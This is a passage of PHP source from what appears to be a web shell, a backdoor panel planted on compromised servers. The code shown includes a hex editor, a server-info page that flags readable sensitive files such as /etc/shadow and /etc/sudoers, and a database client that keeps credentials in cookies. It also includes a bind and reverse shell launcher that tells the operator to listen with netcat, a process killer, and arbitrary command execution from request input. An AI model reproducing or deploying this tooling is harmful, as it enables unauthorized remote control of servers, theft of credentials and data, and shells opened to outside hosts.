                    $s_fcs = "File saved @ " . $s_time;
                } else {
                    $s_fcs = "Failed to save";
                }
                fclose($s_filez);
            } else {
                $s_fcs = "Permission denied";
            }
        } else {
            if (@is_file($s_f) && !@is_writable($s_f)) {
                $s_fcs = "This file is not writable";
            }
        }

        if (!empty($s_fcs)) {
            $s_result .= notif($s_fcs);
        }

        $s_result .= "<form action='" . $s_self . "' method='post'><p class='ce mp'><input type='text' class='inputz' style='width:100%;' name='hexedit' value='" . hss($s_f) . "' /></p><p class='bb' style='padding:0 0 14px 0;'><input type='submit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return sh();\" /></p><table class='explore'>";

        if (@is_file($s_f)) {
            $s_fp = fopen($s_f, "r");
            if ($s_fp) {
                $s_ldump    = "";
                $s_counter  = 0;
                $s_icounter = 0;
                while (!feof($s_fp)) {
                    $s_line    = fread($s_fp, 32);
                    $s_linehex = strtoupper(bin2hex($s_line));
                    $s_linex   = str_split($s_linehex, 2);
                    $s_linehex = implode(" ", $s_linex);
                    $s_addr    = sprintf("%08xh", $s_icounter);

                    $s_result .= "<tr><td class='ce w60'>" . $s_addr . "</td><td class='le w594'><input onselect='this.selectionEnd=this.selectionStart;' onclick=\"hu('" . $s_counter . "',event);\" onkeydown=\"return hf('" . $s_counter . "',event);\" onkeyup=\"hu('" . $s_counter . "',event);\" type='text' class='inputz w578' id='hex_" . $s_counter . "' name='hx[]' value='" . $s_linehex . "'  maxlength='" . strlen($s_linehex) . "' /></td><td class='le ls2'><pre name='hexdump' id='dump_" . $s_counter . "' class='mp'></pre></td></tr>";
                    $s_counter ++;
                    $s_icounter += 32;
                }
                $s_result .= "<input type='hidden' id='counter' value='" . $s_counter . "' />";
                $s_result .= "<textarea name='hxt' id='hxt' class='sembunyi'></textarea>";
                fclose($s_fp);
            }
        }
        $s_result .= "</table></form>";

    } // show server information
    elseif (isset($_GP['x']) && ($_GP['x'] == 'info')) {
        $s_result = "";
        // server misc info
        $s_result .= "<p class='notif' onclick=\"toggle('info_server')\">Server Info</p>";
        $s_result .= "<div class='info' id='info_server'><table>";

        if ($s_win) {
            foreach (range("A", "Z") as $s_letter) {
                if ((@is_dir($s_letter . ":\\") && @is_readable($s_letter . ":\\"))) {
                    $s_drive = $s_letter . ":";
                    $s_result .= "<tr><td>drive " . $s_drive . "</td><td>" . ts(disk_free_space($s_drive)) . " free of " . ts(disk_total_space($s_drive)) . "</td></tr>";
                }
            }
        } else {
            $s_result .= "<tr><td>root partition</td><td>" . ts(@disk_free_space("/")) . " free of " . ts(@disk_total_space("/")) . "</td></tr>";
        }

        $s_result .= "<tr><td>php</td><td>" . phpversion() . "</td></tr>";
        $s_access = array(
            "s_python",
            "s_perl",
            "s_ruby",
            "s_node",
            "s_nodejs",
            "s_gcc",
            "s_java",
            "s_javac",
            "s_tar",
            "s_wget",
            "s_lwpdownload",
            "s_lynx",
            "s_curl"
        );
        foreach ($s_access as $s) {
            $s_t = explode("_", $s);
            if (isset($$s)) {
                $s_result .= "<tr><td>" . $s_t[1] . "</td><td>" . $$s . "</td></tr>";
            }
        }

        if (!$s_win) {
            $s_interesting = array(
                "/etc/os-release",
                "/etc/passwd",
                "/etc/shadow",
                "/etc/group",
                "/etc/issue",
                "/etc/issue.net",
                "/etc/motd",
                "/etc/sudoers",
                "/etc/hosts",
                "/etc/aliases",
                "/proc/version",
                "/etc/resolv.conf",
                "/etc/sysctl.conf",
                "/etc/named.conf",
                "/etc/network/interfaces",
                "/etc/squid/squid.conf",
                "/usr/local/squid/etc/squid.conf",
                "/etc/ssh/sshd_config",
                "/etc/httpd/conf/httpd.conf",
                "/usr/local/apache2/conf/httpd.conf",
                " /etc/apache2/apache2.conf",
                "/etc/apache2/httpd.conf",
                "/usr/pkg/etc/httpd/httpd.conf",
                "/usr/local/etc/apache22/httpd.conf",
                "/usr/local/etc/apache2/httpd.conf",
                "/var/www/conf/httpd.conf",
                "/etc/apache2/httpd2.conf",
                "/etc/httpd/httpd.conf",
                "/etc/lighttpd/lighttpd.conf",
                "/etc/nginx/nginx.conf",
                "/etc/fstab",
                "/etc/mtab",
                "/etc/crontab",
                "/etc/inittab",
                "/etc/modules.conf",
                "/etc/modules"
            );
            foreach ($s_interesting as $s_f) {
                if (@is_file($s_f) && @is_readable($s_f)) {
                    $s_result .= "<tr><td>" . $s_f . "</td><td><a href='" . $s_self . "view=" . pl($s_f) . "'>" . $s_f . " is readable</a></td></tr>";
                }
            }
        }
        $s_result .= "</table></div>";

        if (!$s_win) {
            // cpu info
            if ($s_i_buff = trim(@fgc("/proc/cpuinfo"))) {
                $s_result .= "<p class='notif' onclick=\"toggle('info_cpu')\">CPU Info</p>";
                $s_result .= "<div class='info' id='info_cpu'>";
                $s_i_buffs = explode("\n\n", $s_i_buff);
                foreach ($s_i_buffs as $s_i_buffss) {
                    $s_i_buffss = trim($s_i_buffss);
                    if ($s_i_buffss != "") {
                        $s_i_buffsss = explode("\n", $s_i_buffss);
                        $s_result .= "<table>";
                        foreach ($s_i_buffsss as $s_i) {
                            $s_i = trim($s_i);
                            if ($s_i != "") {
                                $s_ii = explode(":", $s_i);
                                if (count($s_ii) == 2) {
                                    $s_result .= "<tr><td>" . $s_ii[0] . "</td><td>" . $s_ii[1] . "</td></tr>";
                                }
                            }
                        }
                        $s_result .= "</table>";
                    }
                }
                $s_result .= "</div>";
            }

            // mem info
            if ($s_i_buff = trim(@fgc("/proc/meminfo"))) {
                $s_result .= "<p class='notif' onclick=\"toggle('info_mem')\">Memory Info</p>";
                $s_i_buffs = explode("\n", $s_i_buff);
                $s_result .= "<div class='info' id='info_mem'><table>";
                foreach ($s_i_buffs as $s_i) {
                    $s_i = trim($s_i);
                    if ($s_i != "") {
                        $s_ii = explode(":", $s_i);
                        if (count($s_ii) == 2) {
                            $s_result .= "<tr><td>" . $s_ii[0] . "</td><td>" . $s_ii[1] . "</td></tr>";
                        }
                    } else {
                        $s_result .= "</table><table>";
                    }
                }
                $s_result .= "</table></div>";
            }

            // partition
            if ($s_i_buff = trim(@fgc("/proc/partitions"))) {
                $s_i_buff = preg_replace("/\ +/", " ", $s_i_buff);
                $s_result .= "<p class='notif' onclick=\"toggle('info_part')\">Partitions Info</p>";
                $s_result .= "<div class='info' id='info_part'>";
                $s_i_buffs = explode("\n\n", $s_i_buff);
                $s_result .= "<table><tr>";
                $s_i_head = explode(" ", $s_i_buffs[0]);
                foreach ($s_i_head as $s_h) {
                    $s_result .= "<th>" . $s_h . "</th>";
                }
                $s_result .= "</tr>";
                $s_i_buffss = explode("\n", $s_i_buffs[1]);
                foreach ($s_i_buffss as $s_i_b) {
                    $s_i_row = explode(" ", trim($s_i_b));
                    $s_result .= "<tr>";
                    foreach ($s_i_row as $s_r) {
                        $s_result .= "<td style='text-align:center;'>" . $s_r . "</td>";
                    }
                    $s_result .= "</tr>";
                }
                $s_result .= "</table>";
                $s_result .= "</div>";
            }
        }
        $s_phpinfo = array(
            "PHP General"       => INFO_GENERAL,
            "PHP Configuration" => INFO_CONFIGURATION,
            "PHP Modules"       => INFO_MODULES,
            "PHP Environment"   => INFO_ENVIRONMENT,
            "PHP Variables"     => INFO_VARIABLES
        );
        foreach ($s_phpinfo as $s_p => $s_i) {
            $s_result .= "<p class='notif' onclick=\"toggle('" . $s_i . "')\">" . $s_p . "</p>";
            ob_start();
            eval("phpinfo(" . $s_i . ");");
            $s_b = ob_get_contents();
            ob_end_clean();
            if (preg_match("/<body>(.*?)<\/body>/is", $s_b, $r)) {
                $s_body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
                $s_result .= "<div class='info' id='" . $s_i . "'>" . $s_body . "</div>";
            }
        }
    } // working with database
    elseif (isset($_GP['x']) && ($_GP['x'] == 'db')) {
        // sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
        $s_sql         = array();
        $s_sql_deleted = "";
        $s_show_form   = $s_show_dbs = true;

        if (isset($_GP['dc'])) {
            $k = $_GP['dc'];
            setcookie("c[" . $k . "]", "", time() - $s_login_time);
            $s_sql_deleted = $k;
        }

        if (isset($_COOKIE['c']) && !isset($_GP['connect'])) {
            foreach ($_COOKIE['c'] as $c => $d) {
                if ($c == $s_sql_deleted) {
                    continue;
                }
                $s_dbcon = (function_exists("json_encode") && function_exists("json_decode")) ? json_decode($d) : unserialize($d);
                foreach ($s_dbcon as $k => $v) {
                    $s_sql[$k] = $v;
                }
                $s_sqlport = (!empty($s_sql['port'])) ? ":" . $s_sql['port'] : "";
                $s_result .= notif("[" . $s_sql['type'] . "] " . $s_sql['user'] . "@" . $s_sql['host'] . $s_sqlport . "
							<span style='float:right;'><a href='" . $s_self . "x=db&connect=connect&sqlhost=" . pl($s_sql['host']) . "&sqlport=" . pl($s_sql['port']) . "&sqluser=" . pl($s_sql['user']) . "&sqlpass=" . pl($s_sql['pass']) . "&sqltype=" . pl($s_sql['type']) . "'>connect</a> | <a href='" . $s_self . "x=db&dc=" . pl($c) . "'>disconnect</a></span>");
            }
        } else {
            $s_sql['host'] = isset($_GP['sqlhost']) ? $_GP['sqlhost'] : "";
            $s_sql['port'] = isset($_GP['sqlport']) ? $_GP['sqlport'] : "";
            $s_sql['user'] = isset($_GP['sqluser']) ? $_GP['sqluser'] : "";
            $s_sql['pass'] = isset($_GP['sqlpass']) ? $_GP['sqlpass'] : "";
            $s_sql['type'] = isset($_GP['sqltype']) ? $_GP['sqltype'] : "";
        }

        if (isset($_GP['connect'])) {
            $s_con     = sql_connect($s_sql['type'], $s_sql['host'], $s_sql['user'], $s_sql['pass']);
            $s_sqlcode = isset($_GP['sqlcode']) ? $_GP['sqlcode'] : "";

            if ($s_con !== false) {
                if (isset($_GP['sqlinit'])) {
                    $s_sql_cookie = (function_exists("json_encode") && function_exists("json_decode")) ? json_encode($s_sql) : serialize($s_sql);
                    $s_c_num      = substr(md5(time() . rand(0, 100)), 0, 3);
                    while (isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($s_c_num,
                            $_COOKIE['c'])) {
                        $s_c_num = substr(md5(time() . rand(0, 100)), 0, 3);
                    }
                    setcookie("c[" . $s_c_num . "]", $s_sql_cookie, time() + $s_login_time);
                }
                $s_show_form = false;
                $s_result .= "<form action='" . $s_self . "' method='post'>
					<input type='hidden' name='sqlhost' value='" . hss($s_sql['host']) . "' />
					<input type='hidden' name='sqlport' value='" . hss($s_sql['port']) . "' />
					<input type='hidden' name='sqluser' value='" . hss($s_sql['user']) . "' />
					<input type='hidden' name='sqlpass' value='" . hss($s_sql['pass']) . "' />
					<input type='hidden' name='sqltype' value='" . hss($s_sql['type']) . "' />
					<input type='hidden' name='x' value='db' />
					<input type='hidden' name='connect' value='connect' />
					<textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'>" . hss($s_sqlcode) . "</textarea>
					<p><input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>
					</form>";

                if (!empty($s_sqlcode)) {
                    $s_querys = explode(";", $s_sqlcode);
                    foreach ($s_querys as $s_query) {
                        if (trim($s_query) != "") {
                            $s_hasil = sql_query($s_sql['type'], $s_query, $s_con);
                            if ($s_hasil != false) {
                                $s_result .= "<hr /><p style='padding:0;margin:6px 10px;font-weight:bold;'>" . hss($s_query) . ";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";

                                if (!is_bool($s_hasil)) {
                                    $s_result .= "<table class='explore sortable' style='width:100%;'><tr>";
                                    for ($s_i = 0; $s_i < sql_num_fields($s_sql['type'], $s_hasil); $s_i ++) {
                                        $s_result .= "<th>" . @hss(sql_field_name($s_sql['type'], $s_hasil,
                                                $s_i)) . "</th>";
                                    }
                                    $s_result .= "</tr>";
                                    while ($s_rows = sql_fetch_data($s_sql['type'], $s_hasil)) {
                                        $s_result .= "<tr>";
                                        foreach ($s_rows as $s_r) {
                                            if (empty($s_r)) {
                                                $s_r = " ";
                                            }
                                            $s_result .= "<td>" . @hss($s_r) . "</td>";
                                        }
                                        $s_result .= "</tr>";
                                    }
                                    $s_result .= "</table>";
                                }
                            } else {
                                $s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>" . hss($s_query) . ";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";
                            }
                        }
                    }
                } else {
                    if (($s_sql['type'] != 'pdo') && ($s_sql['type'] != 'odbc')) {
                        if ($s_sql['type'] == 'mysql') {
                            $s_showdb = "SHOW DATABASES";
                        } elseif ($s_sql['type'] == 'mssql') {
                            $s_showdb = "SELECT name FROM master..sysdatabases";
                        } elseif ($s_sql['type'] == 'pgsql') {
                            $s_showdb = "SELECT schema_name FROM information_schema.schemata";
                        } elseif ($s_sql['type'] == 'oracle') {
                            $s_showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
                        } elseif ($s_sql['type'] == 'sqlite3' || $s_sql['type'] == 'sqlite') {
                            $s_showdb = "SELECT \"" . $s_sql['host'] . "\"";
                        } else {
                            $s_showdb = "SHOW DATABASES";
                        }

                        $s_hasil = sql_query($s_sql['type'], $s_showdb, $s_con);

                        if ($s_hasil != false) {
                            while ($s_rows_arr = sql_fetch_data($s_sql['type'], $s_hasil)) {
                                foreach ($s_rows_arr as $s_rows) {
                                    $s_result .= "<p class='notif' onclick=\"toggle('db_" . $s_rows . "')\">" . $s_rows . "</p>";
                                    $s_result .= "<div class='info' id='db_" . $s_rows . "'><table class='explore'>";

                                    if ($s_sql['type'] == 'mysql') {
                                        $s_showtbl = "SHOW TABLES FROM " . $s_rows;
                                    } elseif ($s_sql['type'] == 'mssql') {
                                        $s_showtbl = "SELECT name FROM " . $s_rows . "..sysobjects WHERE xtype = 'U'";
                                    } elseif ($s_sql['type'] == 'pgsql') {
                                        $s_showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='" . $s_rows . "'";
                                    } elseif ($s_sql['type'] == 'oracle') {
                                        $s_showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='" . $s_rows . "'";
                                    } elseif ($s_sql['type'] == 'sqlite3' || $s_sql['type'] == 'sqlite') {
                                        $s_showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
                                    } else {
                                        $s_showtbl = "";
                                    }

                                    $s_hasil_t = sql_query($s_sql['type'], $s_showtbl, $s_con);
                                    if ($s_hasil_t != false) {
                                        while ($s_tables_arr = sql_fetch_data($s_sql['type'], $s_hasil_t)) {
                                            foreach ($s_tables_arr as $s_tables) {
                                                if ($s_sql['type'] == 'mysql') {
                                                    $s_dump_tbl = "SELECT * FROM " . $s_rows . "." . $s_tables . " LIMIT 0,100";
                                                } elseif ($s_sql['type'] == 'mssql') {
                                                    $s_dump_tbl = "SELECT TOP 100 * FROM " . $s_rows . ".." . $s_tables;
                                                } elseif ($s_sql['type'] == 'pgsql') {
                                                    $s_dump_tbl = "SELECT * FROM " . $s_rows . "." . $s_tables . " LIMIT 100 OFFSET 0";
                                                } elseif ($s_sql['type'] == 'oracle') {
                                                    $s_dump_tbl = "SELECT * FROM " . $s_rows . "." . $s_tables . " WHERE ROWNUM BETWEEN 0 AND 100;";
                                                } elseif ($s_sql['type'] == 'sqlite' || $s_sql['type'] == 'sqlite3') {
                                                    $s_dump_tbl = "SELECT * FROM " . $s_tables . " LIMIT 0,100";
                                                } else {
                                                    $s_dump_tbl = "";
                                                }

                                                $s_dump_tbl_link = $s_self . "x=db&connect=&sqlhost=" . pl($s_sql['host']) . "&sqlport=" . pl($s_sql['port']) . "&sqluser=" . pl($s_sql['user']) . "&sqlpass=" . pl($s_sql['pass']) . "&sqltype=" . pl($s_sql['type']) . "&sqlcode=" . pl($s_dump_tbl);

                                                $s_result .= "<tr><td ondblclick=\"return go('" . adds($s_dump_tbl_link) . "',event);\"><a href='" . $s_dump_tbl_link . "'>" . $s_tables . "</a></td></tr>";
                                            }
                                        }
                                    }
                                    $s_result .= "</table></div>";
                                }
                            }
                        }
                    }
                }
                sql_close($s_sql['type'], $s_con);
            } else {
                $s_result .= notif("Unable to connect to database");
                $s_show_form = true;
            }
        }

        if ($s_show_form) {
            // sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
            $s_sqllist = array();
            if (function_exists("mysql_connect")) {
                $s_sqllist["mysql"] = "Connect to MySQL <span class='desc' style='font-size:12px;'>- using class mysqli or mysql_*</span>";
            }
            if (function_exists("mssql_connect") || function_exists("sqlsrv_connect")) {
                $s_sqllist["mssql"] = "Connect to MsSQL <span class='desc' style='font-size:12px;'>- using sqlsrv_* or mssql_*</span>";
            }
            if (function_exists("pg_connect")) {
                $s_sqllist["pgsql"] = "Connect to PostgreSQL <span class='desc' style='font-size:12px;'>- using pg_*</span>";
            }
            if (function_exists("oci_connect")) {
                $s_sqllist["oracle"] = "Connect to oracle <span class='desc' style='font-size:12px;'>- using oci_*</span>";
            }
            if (function_exists("sqlite_open")) {
                $s_sqllist["sqlite"] = "Connect to SQLite <span class='desc' style='font-size:12px;'>- using sqlite_*</span>";
            }
            if (class_exists("SQLite3")) {
                $s_sqllist["sqlite3"] = "Connect to SQLite3 <span class='desc' style='font-size:12px;'>- using class SQLite3</span>";
            }
            if (function_exists("odbc_connect")) {
                $s_sqllist["odbc"] = "Connect via ODBC <span class='desc' style='font-size:12px;'>- using odbc_*</span>";
            }
            if (class_exists("PDO")) {
                $s_sqllist["pdo"] = "Connect via PDO <span class='desc' style='font-size:12px;'>- using class PDO</span>";
            }

            foreach ($s_sqllist as $s_sql['type'] => $s_sqltitle) {
                if ($s_sql['type'] == "odbc" || $s_sql['type'] == "pdo") {
                    $s_result .= "<div class='mybox'><h2>" . $s_sqltitle . "</h2>
					<form action='" . $s_self . "' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='" . $s_sql['type'] . "' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
                } elseif ($s_sql['type'] == "sqlite" || $s_sql['type'] == "sqlite3") {
                    $s_result .= "<div class='mybox'><h2>" . $s_sqltitle . "</h2>
					<form action='" . $s_self . "' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DB File</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='" . $s_sql['type'] . "' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
                } else {
                    $s_result .= "<div class='mybox'><h2>" . $s_sqltitle . "</h2>
					<form action='" . $s_self . "' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>Host</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					<tr><td>Port (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='" . $s_sql['type'] . "' />
					<input type='hidden' name='sqlinit' value='init' />
					<input type='hidden' name='x' value='db' />
					</form>
					</div>";
                }
            }
        }
    } // bind and reverse shell
    elseif (isset($_GP['x']) && ($_GP['x'] == 'rs')) {
        // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
        $s_rshost = $s_server_ip;

        $s_rsport   = "13123"; // default port
        $s_rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
        $s_rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button";
        $s_rs_err   = "";

        $s_rsbind = $s_rsback = array();

        $s_rsbind["bind_php"] = "Bind Shell <span class='desc' style='font-size:12px;'>- php</span>";
        $s_rsback["back_php"] = "Reverse Shell <span class='desc' style='font-size:12px;'>- php</span>";

        $s_access = array(
            "s_python" => "py",
            "s_perl"   => "pl",
            "s_ruby"   => "rb",
            "s_node"   => "js",
            "s_nodejs" => "js",
            "s_gcc"    => "c",
            "s_javac"  => "java"
        );
        foreach ($s_access as $k => $v) {
            if (isset($$k)) {
                $s_t                    = explode("_", $k);
                $s_rsbind["bind_" . $v] = "Bind Shell <span class='desc' style='font-size:12px;'>- " . $s_t[1] . "</span>";
                $s_rsback["back_" . $v] = "Reverse Shell <span class='desc' style='font-size:12px;'>- " . $s_t[1] . "</span>";
            }
        }

        if ($s_win) {
            $s_rsbind["bind_win"] = "Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>";
            $s_rsback["back_win"] = "Reverse Shell <span class='desc' style='font-size:12px;'>- windows executable</span>";
        }
        $s_rslist = array_merge($s_rsbind, $s_rsback);

        if (!@is_writable($s_cwd)) {
            $s_result .= notif("Directory " . $s_cwd . " is not writable, please change to a writable one");
        }

        foreach ($s_rslist as $s_rstype => $s_rstitle) {
            $s_split = explode("_", $s_rstype);
            if ($s_split[0] == "bind") {
                $s_rspesan    = $s_rspesana;
                $s_rsdisabled = "disabled='disabled'";
                $s_rstarget   = $s_server_ip;
                $s_labelip    = "Server IP";
            } elseif ($s_split[0] == "back") {
                $s_rspesan    = $s_rspesanb;
                $s_rsdisabled = "";
                $s_rstarget   = $s_my_ip;
                $s_labelip    = "Target IP";
            }

            if (isset($_GP[$s_rstype])) {
                if (isset($_GP["rshost_" . $s_rstype])) {
                    $s_rshost_ = $_GP["rshost_" . $s_rstype];
                }
                if (isset($_GP["rsport_" . $s_rstype])) {
                    $s_rsport_ = $_GP["rsport_" . $s_rstype];
                }

                if ($s_split[0] == "bind") {
                    $s_rstarget_packed = $s_rsport_;
                } elseif ($s_split[0] == "back") {
                    $s_rstarget_packed = $s_rsport_ . " " . $s_rshost_;
                }

                if ($s_split[1] == "pl") {
                    $s_rscode = $s_rs_pl;
                } elseif ($s_split[1] == "py") {
                    $s_rscode = $s_rs_py;
                } elseif ($s_split[1] == "rb") {
                    $s_rscode = $s_rs_rb;
                } elseif ($s_split[1] == "js") {
                    $s_rscode = $s_rs_js;
                } elseif ($s_split[1] == "c") {
                    $s_rscode = $s_rs_c;
                } elseif ($s_split[1] == "java") {
                    $s_rscode = $s_rs_java;
                } elseif ($s_split[1] == "win") {
                    $s_rscode = $s_rs_win;
                } elseif ($s_split[1] == "php") {
                    $s_rscode = $s_rs_php;
                }

                $s_buff = rs($s_rstype, $s_rstarget_packed, $s_rscode);
                if ($s_buff != "") {
                    $s_rs_err = notif(hss($s_buff));
                }
            }
            $s_result .= "<div class='mybox'><h2>" . $s_rstitle . "</h2>
			<form action='" . $s_self . "' method='post' />
			<table class='myboxtbl'>
			<tr><td style='width:100px;'>" . $s_labelip . "</td><td><input " . $s_rsdisabled . " style='width:100%;' class='inputz' type='text' name='rshost_" . $s_rstype . "' value='" . hss($s_rstarget) . "' /></td></tr>
			<tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='rsport_" . $s_rstype . "' value='" . hss($s_rsport) . "' /></td></tr>
			</table>
			<input type='submit' name='" . $s_rstype . "' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			&nbsp;&nbsp;<span>" . $s_rspesan . "</span>
			<input type='hidden' name='x' value='rs' />
			</form>
			</div>";
        }
        $s_result = $s_rs_err . $s_result;
    } // task manager
    elseif (isset($_GP['x']) && ($_GP['x'] == 'ps')) {
        $s_buff = "";
        // kill process specified by pid
        if (isset($_GP['pid'])) {
            $s_p    = trim($_GP['pid'], "|");
            $s_parr = explode("|", $s_p);

            foreach ($s_parr as $s_p) {
                if (function_exists("posix_kill")) {
                    $s_buff .= (posix_kill($s_p,
                        '9')) ? notif("Process with pid " . $s_p . " has been successfully killed") : notif("Unable to kill process with pid " . $s_p);
                } else {
                    if (!$s_win) {
                        $s_buff .= notif(exe("kill -9 " . $s_p));
                    } else {
                        $s_buff .= notif(exe("taskkill /F /PID " . $s_p));
                    }
                }
            }
        }

        if (!$s_win) {
            $s_h = "ps aux";
        } // nix
        else {
            $s_h = "tasklist /V /FO csv";
        } // win
        $s_wcount   = 11;
        $s_wexplode = " ";
        if ($s_win) {
            $s_wexplode = "\",\"";
        }

        $s_res = exe($s_h);
        if (trim($s_res) == '') {
            $s_result = notif("Error getting process list");
        } else {
            if ($s_buff != "") {
                $s_result = $s_buff;
            }
            $s_result .= "<table class='explore sortable'>";
            if (!$s_win) {
                $s_res = preg_replace('#\ +#', ' ', $s_res);
            }

            $s_psarr    = explode("\n", $s_res);
            $s_fi       = true;
            $s_tblcount = 0;

            $s_check  = explode($s_wexplode, $s_psarr[0]);
            $s_wcount = count($s_check);

            foreach ($s_psarr as $s_psa) {
                if (trim($s_psa) != '') {
                    if ($s_fi) {
                        $s_fi   = false;
                        $s_psln = explode($s_wexplode, $s_psa, $s_wcount);
                        $s_result .= "<tr><th style='width:24px;' class='sorttable_nosort'></th><th class='sorttable_nosort'>action</th>";
                        foreach ($s_psln as $s_p) {
                            $s_result .= "<th>" . trim(trim(strtolower($s_p)), "\"") . "</th>";
                        }
                        $s_result .= "</tr>";
                    } else {
                        $s_psln = explode($s_wexplode, $s_psa, $s_wcount);
                        $s_result .= "<tr>";
                        $s_tblcount = 0;
                        foreach ($s_psln as $s_p) {
                            $s_pid     = trim(trim($s_psln[1]), "\"");
                            $s_piduniq = substr(md5($s_pid), 0, 8);
                            if (trim($s_p) == "") {
                                $s_p = "&nbsp;";
                            }
                            if ($s_tblcount == 0) {
                                $s_result .= "<td style='text-align:center;text-indent:4px;'><input id='" . $s_piduniq . "' name='cbox' value='" . $s_pid . "' type='checkbox' class='css-checkbox' onchange='hilite(this);' /><label for='" . $s_piduniq . "' class='css-label'></label></td><td class='ce'><a href='" . $s_self . "x=ps&pid=" . $s_pid . "'>kill</a></td><td class='ce'>" . trim(trim($s_p),
                                        "\"") . "</td>";
                                $s_tblcount ++;
                            } else {
                                $s_tblcount ++;
                                if ($s_tblcount == count($s_psln)) {
                                    $s_result .= "<td class='le'>" . trim(trim($s_p), "\"") . "</td>";
                                } else {
                                    $s_result .= "<td class='ce'>" . trim(trim($s_p), "\"") . "</td>";
                                }
                            }
                        }
                        $s_result .= "</tr>";
                    }
                }
            }
            $colspan = count($s_psln) + 1;
            $s_result .= "<tfoot><tr class='cbox_selected'><td class='cbox_all'>
			<form action='" . $s_self . "' method='post'><input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /><label for='checkalll' class='css-label'></label></form>
			</td><td style='text-indent:10px;padding:2px;' colspan=" . $colspan . "><a href='javascript: pkill();'>kill selected <span id='total_selected'></span></a></td>
			</tr></tfoot></table>";
        }
    } elseif (isset($_GP['x']) && ($_GP['x'] == 'pass')) {
        if (isset($_GP['submitnewpass'])) {
            $newpass  = isset($_GP['newpass']) ? trim($_GP['newpass']) : "";
            $newpassx = isset($_GP['newpassx']) ? trim($_GP['newpassx']) : "";

            if (empty($newpass) || empty($newpassx)) {
                $s_result .= notif('Give your new password to both fields');
            } elseif ($newpass != $newpassx) {
                $s_result .= notif('Password does not match');
            } else {
                if (changepass($newpass)) {
                    $s_result .= notif("Password changed");
                } else {
                    $s_result .= notif("Unable to change password");
                }
            }
        }


        $s_result .= "<div class='mybox'><h2>Change shell password</h2>
			<form action='" . $s_self . "' method='post' />
			<table class='myboxtbl'>
			<tr><td style='width:120px;'>New password</td><td><input style='width:100%;' class='inputz' type='password' name='newpass' value='' /></td></tr>
			<tr><td style='width:120px;'>Confirm password</td><td><input style='width:100%;' class='inputz' type='password' name='newpassx' value='' /></td></tr>
			</table>
			<input type='submit' name='submitnewpass' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='pass' />
			</form>
			</div>";
    } else {
        if (!isset($s_cwd)) {
            $s_cwd = "";
        }
        if (isset($_GP['cmd'])) {
            $s_cmd = $_GP['cmd'];
            if (strlen($s_cmd) > 0) {
                if (preg_match('#^cd(\ )+(.*)#', $s_cmd, $s_r)) {
                    $s_nd = trim($s_r[2]);
                    if (@is_dir($s_nd)) {
                        chdir($s_nd);
                        $s_cwd = cp(getcwd());
                        setcookie("cwd", $s_cwd, time() + $s_login_time);
                        $s_result .= showdir($s_cwd);
                    } elseif (@is_dir($s_cwd . $s_nd)) {
                        chdir($s_cwd . $s_nd);
                        $s_cwd = cp(getcwd());
                        setcookie("cwd", $s_cwd, time() + $s_login_time);
                        $s_result .= showdir($s_cwd);
                    } else {
                        $s_result .= notif(hss($s_nd) . " is not a directory");
                    }
                } else {
                    $s_r = hss(exe($s_cmd));
                    if ($s_r != '') {
                        $s_result .= "<pre>" . $s_r . "</pre>";
                    } else {
